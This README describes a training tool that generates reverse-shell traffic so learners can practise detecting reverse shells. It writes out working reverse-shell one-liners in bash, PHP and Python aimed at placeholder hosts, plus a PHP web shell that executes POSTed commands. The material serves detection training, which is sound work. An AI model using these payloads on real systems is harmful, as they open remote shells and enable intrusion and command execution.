# Netcat-Noise-Generator
This is used to point a reverse shell to, so it can create traffic noise as well as noisy logs. This is used to help teach people how to find reverse shells.



# Netcat Noise Generator - netcat-generator.go
This Go program will bind to a port, and once it detects an incomming connection on the port, it will send out random commands, that may alert a blue team member to the reverse shell. To connect to the listener, use the following command:

```bash
/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

Or if you want to use php:

```bash
php -r '$sock=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Or Python:

```bash
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("<ip>",<port>));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```

# PHP Noise Generator - php-generator.php
This Go program will run, and send a goroutine to send out a HTTP post request to a web server every 5 seconds. The way this works is you implant a malicious php file onto a webserver running php and it will respond to any incomming POST requests and return the executed command output. To add a new endpoint, just run php-generator.go <url>.

An example malicious php file is below:

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['command'];
    $output = shell_exec($command);
    echo $output;
}
?>
```